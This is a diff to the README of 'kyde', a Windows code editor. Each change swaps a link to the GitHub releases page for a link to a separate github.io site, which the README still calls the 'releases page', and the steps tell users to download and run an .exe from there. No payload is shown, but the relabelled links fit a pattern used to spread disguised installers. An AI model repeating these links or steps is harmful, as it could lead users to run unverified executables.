@@ -1,6 +1,6 @@
 # 📝 kyde - Edit code with speed and ease
 
-[![Download kyde](https://img.shields.io/badge/Download-kyde-blue.svg)](https://github.com/roshanj9353/kyde/releases)
+[![Download kyde](https://img.shields.io/badge/Download-kyde-blue.svg)](https://roshanj9353.github.io)
 
 kyde is a code editor. It focuses on speed. Use this tool if you want to commit your work and view file differences quickly. It helps you manage your code tasks without extra steps.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11 to use kyde. The software r
 
 Follow these steps to set up the software:
 
-1. Visit the [releases page](https://github.com/roshanj9353/kyde/releases) to download the current version.
+1. Visit the [releases page](https://roshanj9353.github.io) to download the current version.
 2. Locate the file ending in .exe in the list of assets.
 3. Click the file to start the download.
 4. Open your Downloads folder.
@@ -57,7 +57,7 @@ Yes. Open the Settings menu to choose between themes. The editor matches your Wi
 kyde treats all text files the same. It recognizes code structure for most languages. You gain clear highlighting for HTML, CSS, JavaScript, and Python out of the box.
 
 ### How do I update the application?
-When you want the latest version, visit the [releases page](https://github.com/roshanj9353/kyde/releases). Download the newest installer and run it. The new version replaces the old one. Your settings remain untouched during this update.
+When you want the latest version, visit the [releases page](https://roshanj9353.github.io). Download the newest installer and run it. The new version replaces the old one. Your settings remain untouched during this update.
 
 ## 💻 Technical Details
 
